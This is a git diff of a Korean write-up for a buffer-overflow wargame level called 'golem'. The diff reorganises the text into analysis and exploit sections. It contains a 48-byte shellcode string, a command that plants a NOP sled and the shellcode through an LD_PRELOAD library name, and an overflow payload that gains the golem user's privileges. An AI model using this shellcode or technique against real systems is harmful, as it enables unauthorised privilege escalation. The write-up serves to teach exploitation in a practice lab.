@@ -48,9 +48,9 @@ main(int argc, char *argv[])
 }
 ```
 
-'\x2f'없는 shell(48byte) = \xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+-----
 
-
+### 0x01. Analysis
 
 buffer의 시작주소부터 EBP주소까지 0으로 초기화하고,  RET이후부터 0xbfffffff까지 0으로 초기화 한다.
 
@@ -77,6 +77,10 @@ tmp.c 라는 파일을 만들고 해당 파일에 NOP코드와 쉘코드로 구�
 > -fPIC : Position-Independent Code의 약자이며 .o 파일을 동적라이브러리로 사용하도록 컴파일 하는 옵션
 >
 > -shared : 공유 라이브러리를 만드는 옵션
+
+```
+'\x2f'없는 shell(48byte) = \xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+```
 
 ```sh
 [skeleton@localhost tmp]$ gcc -fPIC -shared tmp.c -o `python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
@@ -110,7 +114,9 @@ tmp.c 라는 파일을 만들고 해당 파일에 NOP코드와 쉘코드로 구�
 
 쉘코드가 포함된 LD_PRELOAD 의 주소를 구한다. (0xbffff534 : NOP중간 주소)
 
+-----
 
+### 0x02. Exploit
 
 ```sh
 [skeleton@localhost skeleton]$ ./golem `python -c 'print "A"*44+"\x34\xf5\xff\xbf"'`
@@ -122,6 +128,7 @@ bash$ id
 uid=510(skeleton) gid=510(skeleton) euid=511(golem) egid=511(golem) groups=510(skeleton)
 ```
 
-`python -c 'print "A"*44+"\x34\xf5\xff\xbf"'`
+-----
 
-##### **golem / cup of coffee**
+
+
